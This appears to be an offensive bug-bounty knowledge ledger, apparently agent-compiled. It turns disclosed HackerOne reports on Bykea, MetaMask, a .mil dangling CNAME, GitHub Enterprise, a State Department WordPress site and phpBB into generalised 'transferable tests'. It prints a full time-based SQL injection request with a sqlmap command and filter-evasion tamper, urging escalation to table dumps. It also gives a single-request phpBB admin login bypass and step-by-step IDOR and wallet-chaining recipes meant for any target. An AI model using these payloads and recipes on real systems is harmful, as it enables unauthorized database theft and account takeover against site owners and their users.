ROUTE: `web_extract` on the live HTML page -> HTTP 200, but the body is only the program's "Summary by Bykea"; the live `.json` route answers `visibility: no-content`, `vulnerability_information` 0 B, so no researcher request shape is published anywhere. Route that worked: the live HTML page's program summary. The technique below is carried by the PROGRAM'S OWN SUMMARY, verbatim.
STATUS: UNVERIFIED (not reproduced — no Bykea endpoint was touched this pass; the chain is the program's own summary wording).
CLASS: broken access control / sensitive identifier disclosure over a REALTIME feed — an identifier (`trip_no`) is broadcast to drivers before a bid is accepted, and that identifier is the key to the customer's tracking URL, so an unassigned driver can read the customer's information (CWE-284 / CWE-200; HackerOne weakness "Improper Access Control - Generic", severity medium 6.5 — downgraded from high 7.5, reporter `mrrhacker`, submitted 2023-10-15, disclosed 2025-06-26, asset *.bykea.n... [WILDCARD], CVSS AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).
CORE METHOD (verbatim from the program's summary):
  1. THE FINDING, verbatim: "@mrrhacker discovered a vulnerability in Bykea's WebSocket implementation where trip_no was exposed to drivers before a bid was accepted."
  2. THE CHAIN, verbatim: "This identifier could be used to access customer tracking URLs, revealing excessive information of the customers to unauthorised drivers."
  3. THE FIX, verbatim: "The issue was resolved by masking sensitive identifiers in WebSocket responses and introducing hashing in tracking URLs to prevent unauthorised access."
  4. THE REQUEST SHAPE (NOT published anywhere — no endpoint, frame or parameter is named in the public record; recorded so the entry is testable): a ride-hailing / logistics platform's driver app holds a WebSocket to the dispatch feed; the feed pushes trip objects containing `trip_no`; the customer-facing tracking URL is `/<tracking-path>/<trip_no>` (or `?trip_no=`). The defect is that the FEED authorizes the driver's presence on the socket but not the driver's assignment to the trip, and the tracking URL authorizes nothing beyond possession of `trip_no`.
DETECTION SIGNAL: a realtime feed (WebSocket / Socket.IO / SSE / long-poll) that pushes an object identifier to a role BEFORE that role is assigned to the object (pre-bid, pre-accept, pre-checkout, pre-booking); an identifier that is also accepted by a customer / user-facing URL as the SOLE key; a tracking / order / status URL reachable with no session or with any role's session; a fix whose wording is "masking identifiers in the feed" + "hashing the tracking URL" — that fix wording is itself the tell that the identifier WAS the capability.
CHAIN: a driver (or any authenticated socket client) connects to the dispatch WebSocket (primitive: a low-privilege role on the realtime feed) -> the feed broadcasts `trip_no` for trips that have not yet been assigned to that driver (primitive: the feed authorizes subscription, not per-object access) -> the attacker replays `trip_no` against the customer tracking URL (escalation: the tracking URL treats possession of the identifier as authorization) -> the attacker reads the customer's trip information (impact: unauthorized disclosure of customer PII to a driver with no assignment; program rated medium 6.5, C:H). Per doctrine §8: preconditions = an authenticated driver / account on the platform (PR:L) and no assignment to the victim's trip; gain = read access to the customer's tracking information.
TRANSFERABLE TEST: on ANY platform with a realtime dispatch / order feed AND a customer-facing tracking / status URL (ride-hailing, logistics, delivery, booking, support-call routing) — (1) connect to the WebSocket / SSE feed with your own low-privilege account and log every identifier the server pushes (`trip_no`, `order_id`, `booking_id`, `session_id`, `call_id`); (2) note identifiers pushed BEFORE you are assigned / accepted / checked out; (3) replay each captured identifier against the customer / user-facing tracking or status URL — `/track/<id>`, `/order/<id>`, `/status?trip_no=<id>`, `/t/<id>` — unauthenticated, then with your own session, then with a second account's session; (4) a 200 / 302 that renders the customer's name, phone, address, route or status is the finding; (5) vary the identifier (+1 / -1, enumerate) to size the leak, and check whether the tracking URL is on the SAME host as the app (an internal host is a stronger finding). Rule: **a realtime feed that pushes an object identifier before the subscriber is assigned to that object is a BAC primitive — capture the identifier from the socket and replay it against the customer tracking URL; if possession of the identifier is the only authorization, the feed is leaking every customer's data to every subscriber.**
DEDUPE: 0 hits across all three write targets for `2209750`, `mrrhacker`, `trip_no`, `tripNo`, `Bykea`. Pre-existing `WebSocket` hits (87) REVIEWED as related-but-distinct: §17.240 (Socket.IO SSPP prototype pollution — a parser/confusion bug), the stored-XSS-over-an-unvalidated-realtime-frame entry (a client-side-only sanitisation bug), the WebSocket Turbo Intruder tooling entry, and the Electron DevTools WebSocket entry — NONE records a realtime feed leaking an OBJECT IDENTIFIER that keys a customer-facing tracking URL. New general method -> §17.375.

SOURCE: https://hackerone.com/reports/1941767  2026-11-10
ROUTE: `web_extract` on the live HTML page -> HTTP 200, the FULL body rendered (Summary by MetaMask, the reporter's Reproduction with both PoC variants, Impact, Final notes, and the severity/weakness block). The `.json` route was returned head+tail truncated, so the HTML page is the route that carried the technique. No fallback route needed.
STATUS: UNVERIFIED (not reproduced — no MetaMask Mobile build was driven this pass; the PoC snippets and the impact wording are verbatim from the report body).
CLASS: client-side security misconfiguration WITH demonstrated impact / reflected XSS — an in-app mobile browser DROPS the website's `Content-Security-Policy` header, so a site whose XSS is blocked by a strict CSP in ordinary browsers becomes exploitable in the in-app browser; the MetaMask provider is injected into every page, so the executed script can call the wallet (CWE-79 / CWE-346; HackerOne weakness "Cross-site Scripting (XSS) - Reflected", severity medium 4.7, reporter `renniepak`, submitted 2023-04-11, disclosed 2024-08-27, asset MetaMask Mobile (Android)).
CORE METHOD (verbatim from the report body):
  1. THE DISCOVERY, verbatim: "Recently I came across a Cross-Site Scripting bug on the website of a well known crypto company. They had a very strict Content-Security-Policy header, effectively preventing me from achieving anything more then a simple HTML injection with it. That all changed when I opened up the website in MetaMasks browser (in the Android app), when all the sudden my XSS payload did execute. Upon further investigation, it seems that the browser in MetaMask ignores any Content-Security-Policy headers."
  2. THE PROGRAM'S OWN SUMMARY, verbatim: "@renniepak discovered an issue with the MetaMask Mobile browser where it ignored `content-security-policy` headers set by websites. This occurred due to an error in how the application was handling web requests while trying to ensure that the MetaMask JavaScript provider was not blocked after being injected into a webpage."
  3. POC VARIANT 1 (CSP in a `<meta>` tag), verbatim: the page sets `<meta http-equiv="Content-Security-Policy" content="script-src 'none'">` and then `<script>alert('Javascript is executed.')</script>`; in MetaMask's browser the script runs.
  4. POC VARIANT 2 (CSP in the RESPONSE HEADER), verbatim: `<?php header("Content-Security-Policy: script-src 'none'"); ?>` followed by the same inline `<script>`; again the script runs — proving the HEADER form is ignored, not just the meta form.
  5. THE IMPACT, verbatim: "Websites use a Content-Security-Policy as a last line of defence against Cross-Site Scripting attacks. If it the browser fails to enforce the Content-Security-Policy as expected, a website that is vulnerable to Cross-Site Scripting can be compromised in numerous ways. One Metamask specific example is that the attacker could create a XSS payload that will interact with the MetaMask wallet directly."
  6. THE REPORTER'S OWN NOTE, verbatim: "Content-Security-Policy seems to be working but only when used in a `<meta>` tag" — i.e. the meta form is honoured while the header form is not, which is why the two-variant PoC matters.
DETECTION SIGNAL: an in-app browser / WebView / hybrid app browser that renders third-party sites; a site whose XSS payload is blocked in Chrome / Firefox but EXECUTES in the in-app browser; a test page that sets `Content-Security-Policy: script-src 'none'` via BOTH a `<meta http-equiv>` tag AND a response header, with an inline `<script>` — if the header form is ignored, the script runs; a wallet / password-manager / banking SDK injected into every page (the escalation surface); a browser that adds a provider object (`window.ethereum`, `window.solana`, a banking bridge) to the page context.
CHAIN: an attacker finds an XSS on a third-party site that is defended by a strict CSP in ordinary browsers (primitive: a reflected / DOM XSS whose only remaining defence is the CSP) -> the victim opens the same URL inside an in-app browser that DROPS the CSP header (primitive: the client-side security control is not enforced by the client) -> the payload executes in the site's origin (escalation: a "CSP-protected" XSS becomes a live XSS) -> because the in-app browser injects a wallet / provider object into every page, the payload can call the provider's methods (escalation: the executed script reaches the wallet bridge) -> the attacker can request transactions / signatures / approvals from the victim's wallet (impact as asserted by the reporter: direct interaction with the MetaMask wallet; program rated medium 4.7). Per doctrine §8: preconditions = the victim uses the in-app browser and visits the attacker's URL (or a compromised page); gain = script execution in the site's origin plus access to the injected provider. HONESTY: the report DEMONSTRATES the CSP header being ignored and the inline script executing; the wallet-interaction escalation is asserted by the reporter as "one Metamask specific example" and is not shown end-to-end in the public body.
TRANSFERABLE TEST: for EVERY in-app browser / WebView / hybrid app browser in scope (crypto wallets, password managers, banking apps, shopping / social in-app browsers, enterprise WebViews) — (1) build a test page that sets `Content-Security-Policy: script-src 'none'` in BOTH a `<meta http-equiv="Content-Security-Policy">` tag AND a response header (`header("Content-Security-Policy: script-src 'none'")` in PHP, or the equivalent in any backend), with an inline `<script>alert(document.domain)</script>`; (2) open the page in the target in-app browser and in Chrome / Firefox as the control; (3) if the script executes in the in-app browser while the header form is ignored (and the meta form is honoured), the browser fails to enforce CSP — record WHICH form is dropped; (4) then CHAIN, never stop here: enumerate the provider / bridge objects the browser injects (`window.ethereum`, `window.solana`, `window.*Provider`, a banking JS bridge) and test whether the executed payload can call their sensitive methods; (5) test the same payload against a real CSP-protected XSS candidate in scope to show the CSP was the only defence. Rule: **an in-app browser that drops the site's `Content-Security-Policy` header converts every CSP-defended XSS on every site it renders into a live XSS — test it with a page that sets `script-src 'none'` in both a meta tag and a response header, and if the header form is ignored, enumerate the injected wallet / provider bridge as the escalation.**
DEDUPE: 0 hits across all three write targets for `1941767`, `renniepak`, `MetaMask`, `metamask`, `in-app browser`, `wallet provider injection`. Pre-existing `CSP` / `script-src` hits (325 / 66) REVIEWED as related-but-distinct: §17.228 (untrusted-CSS exfiltration), the Sentry-DSN-from-CSP-header SSRF entry, a generic "read the CSP header first" triage line, and the many CSP-bypass payload entries — NONE records a CLIENT-SIDE BROWSER that fails to ENFORCE the site's CSP header (the inverse of a CSP bypass: the defence is present on the server and absent in the client). §17.371 (Kaspersky URL Advisor) is a security component's injected widget served from the host origin — a widget-trust bug, not a CSP-enforcement failure by the browser. New general method -> §17.376.
SOURCE: https://hackerone.com/reports/2499178  2026-11-10
ROUTE: `web_extract` on the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` 3,401 B read IN FULL; the live HTML page rendered the same body (the reporter's `dig` + `whois` transcript). Route that worked: the live `.json` route, corroborated by the live HTML page.
STATUS: UNVERIFIED (not reproduced — no domain was registered and no target was touched; the reporter also declined to register because of the `.us` residency rule; every command and output below is verbatim from the report body).
CLASS: subdomain takeover / server-side DNS misconfiguration WITH impact — a first-party `.mil` hostname is CNAME'd to a host under a SECOND-LEVEL DOMAIN THAT IS AVAILABLE FOR REGISTRATION, so whoever registers that domain controls the hostname the CNAME points at (CWE-276 / CWE-350; HackerOne weakness "Improper Access Control - Generic", severity critical, reporter `martinvw`, submitted 2024-05-10, disclosed 2024-06-27, asset U.S. Dept Of Defense, no CVE, `has_bounty? false`).
CORE METHOD (verbatim from the report body):
  1. THE FINDING, verbatim: "The subdomain `█████.mil` is pointing to `peosol-lg.███████.`, the domain `██████` is currently available for registration as can be seen at https://www.godaddy.com/nl-nl/domainsearch/find?domainToCheck=█████"
  2. THE DNS EVIDENCE, verbatim (`dig █████.mil`): the ANSWER SECTION is `██████████.mil. 3600 IN CNAME peosol-lg.███.` — the `.mil` host is a CNAME whose target is `peosol-lg.<unregistered-domain>`; the AUTHORITY SECTION is the `.us` ccTLD SOA (`us. 900 IN SOA a.cctld.us. admin.tldns.godaddy.`).
  3. THE REGISTRABILITY EVIDENCE, verbatim: the reporter links the GoDaddy domain-search page for the CNAME target's PARENT domain, and runs `whois ████████.` which answers `% IANA WHOIS server ... refer: whois.nic.us ... domain: US ... status: ACTIVE ... whois: whois.nic.us` and then, at the `.us` registry, `# whois.nic.us` / `No Data Found` — i.e. the second-level domain under the `.us` ccTLD is NOT registered.
  4. THE IMPACT AS STATED, verbatim: "Using this vulnerability an attacker can: host unwanted/malicious content under your domain; receive email on subdomains mentioned above; effectively execute cross-site scripting attacks; in some cases, steal cookie data; in some cases, trick password managers into filling passwords"
  5. THE FIX, verbatim: "Remove CNAME record █████████.mil"
  6. THE REPORTER'S OWN LIMIT, verbatim: "Given the rules, residency of the US, of the `us`-tld I decided not to register the domain, also I do believe the output to be enough." — the claim step was NOT executed; the PoC stops at DNS + whois.
DETECTION SIGNAL: `dig <host>` / `dnsx -cname` returning a CNAME whose TARGET is a hostname under a domain that is itself unregistered — `whois <parent-domain>` answers "No Data Found" / no registrant / "Domain not found", or a registrar's domain-search shows it AVAILABLE; a CNAME target that is NOT a cloud-service claim endpoint (no `*.s3.amazonaws.com`, no `*.herokuapp.com`, no `*.cloudfront.net`) and NOT an NS delegation, but a plain domain name; a first-party host on a sensitive TLD (`.mil`, `.gov`) whose CNAME leaves the organisation's DNS. TELL: the CNAME chain ends at a domain you can BUY — the claim is a DOMAIN REGISTRATION, not a cloud-service claim API.
CHAIN: an unauthenticated attacker enumerates the target's subdomains and resolves each one (primitive: public DNS) -> a first-party `.mil` host is a CNAME to `peosol-lg.<domain>` where `<domain>` is unregistered (primitive: the DNS record outlives the domain's registration) -> the attacker registers `<domain>` at a registrar (escalation: the CNAME target is now under the attacker's control, so the `.mil` hostname resolves to the attacker's server) -> the attacker serves content / receives mail / mints a TLS certificate for the first-party hostname (escalation: a trusted-origin asset under attacker control; XSS, cookie theft and password-manager abuse in the parent domain's scope, as the reporter lists). Per doctrine §8: preconditions = the ability to register the unregistered parent domain (for a `.us` ccTLD, US residency per the reporter's note; for a gTLD, none) and no target interaction; gain = control of a first-party hostname's content and mail. HONESTY: the reporter did NOT register the domain, so the chain's last two links are the reporter's stated impact, not a demonstrated exploit; the DNS + whois evidence is first-hand.
TRANSFERABLE TEST: for EVERY in-scope hostname, run `dig <host> +short` / `dnsx -cname` and read the CNAME chain; for each CNAME target, split off the registered domain (`peosol-lg.<domain>` -> `<domain>`) and check whether THAT domain is registered: `whois <domain>` (look for "No Data Found" / no registrant / "Domain not found") and a registrar search (available = claimable). If the parent domain is unregistered, the hostname is takeable by registering it — record the `dig` CNAME line and the `whois` output as the PoC (do NOT register a name you are not authorised to claim; report the DNS evidence). Then measure the blast radius: is the hostname on a sensitive TLD (`.mil`/`.gov`), is the parent domain's cookie scope `.`-prefixed, and is there an MX record — those set the impact. Rule: **a CNAME whose target is a hostname under an UNREGISTERED domain is a subdomain takeover claimable by registering the domain — no cloud-service claim API, no bucket re-creation, no NS zone; the tell is a CNAME to a plain domain name that `whois` says does not exist.**
DEDUPE: 0 hits across all three write targets for `2499178`, `martinvw`, `peosol`, `No Data Found`, `available for registration`, `register the domain`, `parent domain`. Pre-existing subdomain-takeover material REVIEWED as related-but-distinct: §1.6 (dangling CNAME -> a VENDOR app's stored XSS, the trust-boundary inheritance method — not a domain registration), #154425 (dangling CNAME to a DEAD Fastly service -> claim the SERVICE), §17.310 (a static host serving an UNVERIFIED custom domain during a grace window), #1342422 (NS delegation to an UNCLAIMED cloud DNS ZONE -> create the zone), §17.320 (a CNAME target SHARED by two product features -> claim it in the weaker feature), #1406335 (dangling CNAME to a DELETED S3 BUCKET -> re-create the bucket). NONE records a CNAME whose target is a hostname under a domain that is simply UNREGISTERED and therefore claimable by registering the domain. New general method -> §17.377.

SOURCE: https://hackerone.com/reports/2210179  2026-11-10
ROUTE: `web_extract` on the live `.json` route -> HTTP 200, `visibility: no-content`, `vulnerability_information` 0 B; the live HTML page and `r.jina.ai` render only the SPA shell; the browser tool returns "Sorry, something went wrong"; every Wayback capture is a 2-3 KB SPA shell; the disclosed-reports dataset row for id 2210179 also carries a 0-byte body. Route that worked: the CREDITED PUBLIC RECORD — NVD CVE-2023-46646 + the GitHub advisory GHSA-5fwq-2hqv-g62h (`api.github.com/advisories?cve_id=CVE-2023-46646`), read this pass. The method below is the advisory's own description, quoted.
STATUS: UNVERIFIED (not reproduced — no GHES instance was stood up this pass; the endpoint shape is the public GitHub REST route, labelled as such).
CLASS: IDOR / BOLA (CWE-639 Authorization Bypass Through User-Controlled Key) on a CHILD-OBJECT endpoint — the "Get a check run" API returns the PARENT object's name (the private repository) to a caller with no read access to that repository (HackerOne weakness "Insecure Direct Object Reference (IDOR)", severity medium, reporter `ahacker1`, submitted 2023-10-16, disclosed 2024-01-08, CVE-2023-46646, asset github.com, CVSS 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N; fixed in GHES 3.17.19 / 3.8.12 / 3.9.7 / 3.10.4 / 3.11.0).
CORE METHOD (the whole of what is public):
  1. THE FINDING, verbatim from the advisory: "Improper access control in all versions of GitHub Enterprise Server allows unauthorized users to view private repository names via the \"Get a check run\" API endpoint. This vulnerability did not allow unauthorized access to any repository content besides the name."
  2. THE WEAKNESS, verbatim from NVD: "CWE-639 Authorization Bypass Through User-Controlled Key — The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
  3. THE ENDPOINT SHAPE (NOT from the report body — the advisory names only the operation, "Get a check run"; this is the standard public GitHub REST route, recorded so the entry is testable): `GET /repos/{owner}/{repo}/check-runs/{check_run_id}` with an `Accept: application/vnd.github+json` header and either no token or a token that has no access to `{owner}/{repo}`. The defect is that the handler authorizes the CHECK RUN (the child object, keyed by `check_run_id`) but resolves and returns the parent repository's NAME without checking the caller's read access to the repository.
  4. THE AFFECTED SURFACE, verbatim: "This vulnerability affected GitHub Enterprise Server version 3.7.0 and above and was fixed in version 3.17.19, 3.8.12, 3.9.7, 3.10.4, and 3.11.0." — scoped to GHES; GitHub.com was NOT affected.
  5. THE IMPACT AS RATED: NVD CVSS 5.3 / MEDIUM, C:L — the disclosure is limited to the repository NAME; no repository content is exposed.
DETECTION SIGNAL: an API operation that returns a CHILD object (check run, build, deploy, pipeline, artifact, attachment, comment) whose response body EMBEDS the parent object's identifier/name (`repository`, `repo`, `owner`, `project`, `org`); a child-object endpoint that authorizes the child by its own id but never re-checks the caller's read access to the parent; a vendor advisory worded "view private repository names via the <operation> API endpoint" — the operation NAME is the tell that the leak is the parent's name field. TELL: the same operation on github.com is fine while the self-hosted appliance is not — an authorization gap that exists only in the on-prem build.
CHAIN: an unauthorized caller (no token, or a token scoped to other repositories) obtains or guesses a check-run id (primitive: a child-object id, often sequential/obvable) -> the "Get a check run" endpoint returns the check run's details INCLUDING the private repository's NAME, with no read-access check on that repository (escalation: a private repository's existence and name are disclosed to a caller who cannot see the repo) -> the attacker builds a map of the organisation's private repository names (escalation: internal project names, product/acquisition names and team structure leak — non-public information useful for targeting) -> (documented lead, NOT demonstrated: repo name -> repo content, which the advisory explicitly says is NOT reachable). Per doctrine §8: preconditions = network reach to the GHES instance and no read access to the victim repository (PR:N per the CVSS vector); gain = the private repository NAME only. HONESTY: the advisory states the impact is limited to the name and that no repository content is exposed, so the chain's last link is a lead, not a demonstrated escalation; this is a P3-class limited cross-user data read, not a P1/P2.
TRANSFERABLE TEST: on ANY self-hosted / enterprise API (GHES, GitLab, Bitbucket Server, a private Git host, a CI platform) — (1) pick a child-object endpoint that returns a parent reference ("get a check run", "get a build", "get a deploy", "get a pipeline", "get an artifact"); (2) obtain a valid child-object id (create your own in a repo you own, or enumerate/guess — ids are often sequential); (3) call the endpoint with a token that has NO access to the victim repository (a second account, a fine-grained token scoped elsewhere, or no token) — `GET /repos/{owner}/{repo}/check-runs/{id}` with `Accept: application/vnd.github+json`; (4) a 200 whose body contains the victim repository's `name` / `full_name` is the finding; (5) size it by walking the id space (+1/-1, or listing your own repo's check-run ids and testing each against other owners) and record whether the same call works UNAUTHENTICATED; (6) then CHAIN, never stop here: use the leaked repo name to probe whether any OTHER endpoint (search, membership, pages, raw file, git protocol) accepts the name and returns content — the advisory says it does not, so treat that as a MEASURED NEGATIVE unless you prove otherwise. Rule: **a child-object endpoint that embeds the parent object's name and authorizes only the child's id leaks every parent's name to any caller — call "get a check run" (or the equivalent) with a token that has no access to the repo and read the `repository.name` field in the response.**
DEDUPE: 0 hits across all three write targets for `2210179`, `ahacker1`, `CVE-2023-46646`, `GHSA-5fwq-2hqv-g62h`, `check run`, `check_run`, `check-run`, `Get a check run`. Pre-existing GHES material REVIEWED as related-but-distinct: #2332623 -> §17.300 (Management Console nomad-template command injection -> admin SSH), the cross-repo compare/diff IDOR entry (one side of a compare RANGE names a private repo -> private CODE read, a different endpoint and a different leaked asset), #1901040 (gist.github.com SSH-certificate auth bypass), the "add labels to arbitrary issues/PRs" IDOR entry (label operations), and §17.4 (a WordPress REST batch route desync — a different product). NONE records a CHILD-OBJECT endpoint ("Get a check run") whose response embeds the PARENT repository's name and authorizes only the child id. New general method -> §17.378.

SOURCE: https://hackerone.com/reports/1878584  2026-11-10
ROUTE: the live `.json` route answers `visibility: full` but the body is REDACTED in the public rendering (3,118 B with the endpoint/parameter/payload replaced by `███`); the UNREDACTED full body (4,953 B, `visibility: full`) was read this pass from the LOCAL mirror of the public disclosed-reports dataset `/tmp/h1_train.parquet` (`vulnerability_information` column, `/usr/bin/python3.12` + pyarrow 26.0.1). Route that worked: the local disclosed-reports dataset mirror.
STATUS: UNVERIFIED (not reproduced — no WordPress instance was stood up this pass; every request line, command and output below is verbatim from the report body).
CLASS: time-based blind SQL injection in a WORDPRESS CORE search parameter — the search term is accepted in the POST BODY (`search`) on `POST /?s=<term>` and is concatenated into a query, so an unauthenticated caller can enumerate the database (CWE-89; HackerOne weakness "SQL Injection", severity critical, reporter `shadow-krd` (live `.json`; the dataset row shows `shadow1krd`), submitted 2023-02-18, disclosed 2023-04-20, asset U.S. Department of State, no CVE, 55 votes).
CORE METHOD (verbatim from the report body):
  1. THE TARGET, verbatim: "I've identified an SQL injection vulnerability of type Time Based on https://diplomaticrooms.state.gov this site use wordpress cms but its not plugin sql injection"
  2. THE ENTRY POINT, verbatim: "If you look carefully, we see that search in the website name Search results The gap has occurred there" / "as you can see POST Method [POST https://diplomaticrooms.state.gov/?s=porcelain,%20gilt ]" — the WordPress SEARCH endpoint (`?s=`), driven by a POST whose search term rides in the BODY.
  3. THE RAW REQUEST, verbatim (the captured `request.txt`):
```
POST https://diplomaticrooms.state.gov/?s=porcelain,%20gilt HTTP/1.1
Host: diplomaticrooms.state.gov
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Referer: https://diplomaticrooms.state.gov/?s=porcelain,%20gilt
Content-Length: 133
Cookie: AWSALB=...; AWSALBCORS=...
Connection: Close
search=porcelain%2C+gilt%27+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29Xeps%29+AND+%27HlBp%27%3D%27HlBp&post_types%5B%5D=post
```
     Decoded, the injected body parameter is `search=porcelain, gilt' AND (SELECT * FROM (SELECT(SLEEP(5)))Xeps) AND 'HlBp'='HlBp` with a second body parameter `post_types[]=post`.
  4. THE TOOLING COMMAND, verbatim: `python3 sqlmap.py -r request --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs`
     - `-r request` — replay a CAPTURED RAW REQUEST from a file (the whole request, not a URL);
     - `--tamper=space2comment` — the WAF/filter evasion: replace spaces with `/**/` (the payload above is shown with `+` for spaces because it is URL-encoded; the tamper rewrites the injected spaces as inline comments);
     - `--level=5 --risk=3` — test HEADER parameters too and enable the heavy payloads;
     - `--drop-set-cookie` — discard the `Set-Cookie` values the load balancer hands back (the request carries `AWSALB` / `AWSALBCORS` sticky-session cookies), so sqlmap's session is not broken by a rotating cookie.
  5. THE CONFIRMATION, verbatim: `custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y` / `resuming back-end DBMS 'mysql'` / `Parameter: #1* ((custom) POST)` / `Type: boolean-based blind` / `Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)` / `Payload: search=porcelain, gilt' AND (SELECT -9789) OR 6323=6323# FROM (SELECT(SLEEP(5)))Xeps) AND 'HlBp'='HlBp&post_types[]=post` / `back-end DBMS is MySQL` / `web application technology: Apache, PHP 7.4.16` / `back-end DBMS: MySQL 5 (MariaDB fork)`.
  6. THE ENUMERATION, verbatim: `available databases [6]: [*] information_schema [*] innodb [*] mysql [*] pantheon [*] performance_schema [*] tmp` — the `pantheon` database name identifies the host (Pantheon).
  7. THE REPORTER'S OWN LIMIT, verbatim: "Notice: I didn't extracted any data from the database, but just for generate POC" — the PoC stops at enumerating database NAMES.
  8. THE IMPACT AS STATED, verbatim: "the hackers can be dump all information like all database tables then after that login to the website"
DETECTION SIGNAL: a WordPress site whose search works over POST (`POST /?s=<term>` with the term in the `search` body parameter — capture the search request and check the method and body); a search term that is reflected into a DB error or whose response TIME changes with a `SLEEP()` payload; a WAF/filter that blocks bare spaces in the payload (the tell is that the injection only works once spaces are replaced by `/**/`); a load balancer setting `AWSALB` / `AWSALBCORS` (or any sticky) cookies that breaks a scanner's session; sqlmap reporting a `(custom) POST` parameter with a `*` marker. TELL: the reporter's own words — "this site use wordpress cms but its not plugin sql injection" — i.e. the sink is in CORE, so the usual plugin-attribution recon misses it.
CHAIN: an unauthenticated caller reaches the site's search (primitive: a public search form) -> the search term is accepted in the POST BODY and concatenated into a query without parameterisation (primitive: the core search handler's `search` parameter) -> a time-based `SLEEP(5)` payload delays the response, and `--tamper=space2comment` gets the payload past the filter (escalation: a blind time oracle is established) -> sqlmap enumerates the databases (6, including `pantheon`) and can walk tables/columns (escalation: full DB read) -> the reporter's stated impact: dump every table, then authenticate to the website (impact claim; NOT demonstrated — the reporter explicitly stopped at database names). Per doctrine §8: preconditions = none (unauthenticated search) and a WordPress core search reachable over POST; gain = the database (names at minimum, tables/columns by extension). HONESTY: the report demonstrates the injection and the database-name enumeration; the "dump all tables -> login to the website" escalation is the reporter's assertion, not a shown exploit.
TRANSFERABLE TEST: on ANY WordPress target in scope — (1) capture the SEARCH request (`GET` or `POST /?s=<term>`) and inspect the method and body: if the term rides in a POST body parameter (`search=...`), save the whole request to `request.txt`; (2) append a time-based payload to that parameter — `search=<term>' AND (SELECT * FROM (SELECT(SLEEP(5)))Xeps) AND 'HlBp'='HlBp` — and time the response against a baseline (a ~5 s delay is the oracle); (3) if bare spaces are filtered, replay with `sqlmap -r request.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --dbs` (add `--threads 10`); the `-r` + `*` marker makes sqlmap test the POST BODY parameter, `--drop-set-cookie` survives the AWSALB/AWSALBCORS sticky cookies, and `--level 5 --risk 3` tests headers too; (4) read the `available databases [...]` list as the PoC; (5) then CHAIN, never stop here: walk `--tables` / `--columns` / `--dump` on the interesting database, and test whether the dump yields an admin hash or a plaintext third-party key that pivots to wp-admin or RCE (the ledger's #273946 records exactly such a pivot). Rule: **a WordPress search that accepts its term in a POST body parameter is a time-based blind SQLi sink — capture the raw request, replay it with `sqlmap -r request.txt --tamper=space2comment --drop-set-cookie --level=5 --risk=3`, and the `available databases` list is the PoC.**
DEDUPE: 0 hits across all three write targets for `1878584`, `shadow-krd`, `shadow1krd`, `diplomaticrooms`, `post_types`, `drop-set-cookie`, `AWSALB`, `pantheon`, and for `space2comment` AS A BYPASS PAIRED WITH AN ENTRY POINT (the only hit is a generic sqlmap-options list at Bugbountyskills.md ~10757 naming `space2comment` among tamper scripts). Pre-existing WordPress SQLi material REVIEWED as related-but-distinct: §17.4 (a WordPress CORE SQLi via a REST BATCH ROUTE DESYNC — a string-where-an-array-is-expected type confusion, a completely different root cause and endpoint), #273946 (a WordPress PLUGIN SQLi — Formidable Pro's AJAX preview shortcode expansion into ORDER BY, with `--tamper commalesslimit`), §17.301 (the DoD HEADER User-Agent SQLi), §17.305 (time-based blind in a numeric `acctid`), §17.308 (a ColdFusion `countID`). NONE records a WORDPRESS CORE SEARCH `POST /?s=` body-parameter SQLi, and NONE records the `--tamper=space2comment` + `--drop-set-cookie` + `-r request.txt` workflow. New general method -> §17.379.

SOURCE: https://www.aikido.dev/blog/authentication-bypass-phpbb-technical-writeup + CVE-2026-48611 (HackerOne, reported 2026-06-04; fixed phpBB 3.3.17)  2026-11-10
ROUTE: `web_extract` on the Aikido technical writeup -> HTTP 200, the code-level root cause and the login-link flow read in full; the exact PoC request read from the ProjectDiscovery nuclei template `raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2026/CVE-2026-48611.yaml` (HTTP 200, `verified: true`, `max-request: 1`). Corroborated by the ZeroPath CVE analysis and the NVD entry. No HackerOne report body was rendered (the report ID is not published in the sources read).
STATUS: UNVERIFIED (not reproduced — no phpBB instance was stood up this pass; the request shape is the public nuclei/template PoC and the root-cause wording is verbatim from the Aikido writeup).
CLASS: authentication bypass / improper authentication — the `auth_provider` query parameter on the login-link flow selects the authentication backend, and selecting `apache` makes phpBB trust the `Authorization: Basic` header's username WITHOUT any password check (it assumes an upstream Apache `.htpasswd` layer already authenticated the user). Unauthenticated login as ANY account, including the founder administrator, with a single request (CWE-287; CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical; affects phpBB 3.3.0–3.3.16, fixed 3.3.17; reported via HackerOne 2026-06-04, patched 2026-06-06; triaged in under 9 minutes; 21 exploitation attempts observed by 2026-11-06).
CORE METHOD:
  1. THE FLOW — phpBB's "login-link" feature (`ucp.php?mode=login_link`) links an OAuth account to an existing phpBB account. The callback `ucp_login_link.php` first reads `login_link_*` query parameters via `get_login_link_data_array()`; if they are empty it errors with `LOGIN_LINK_NO_DATA_PROVIDED`.
  2. THE CLIENT-CONTROLLED PROVIDER — the `auth_provider` query parameter is freely set by the caller. Setting it to `apache` selects the Apache HTTP Basic Auth provider.
  3. THE PASSWORDLESS BACKEND — the Apache provider authenticates using the `Authorization: Basic` header and performs NO password verification, because it assumes an upstream Apache `.htaccess`/`.htpasswd` layer has already verified the password. The username in the Basic header is trusted as the authenticated identity.
  4. THE POC REQUEST (verbatim from the nuclei template, `max-request: 1`):
     `POST /ucp.php?mode=login_link&auth_provider=apache&login_link_aikido=1 HTTP/1.1`
     `Host: {{Hostname}}`
     `Content-Type: application/x-www-form-urlencoded`
     `Authorization: Basic YWRtaW46eA==`   (base64 of `admin:x`)
     (empty line)
     `login_username=admin&login_password=x&login=Login`
     -> HTTP 302 with a `phpbb_sid` cookie -> the caller is logged in as `admin`.
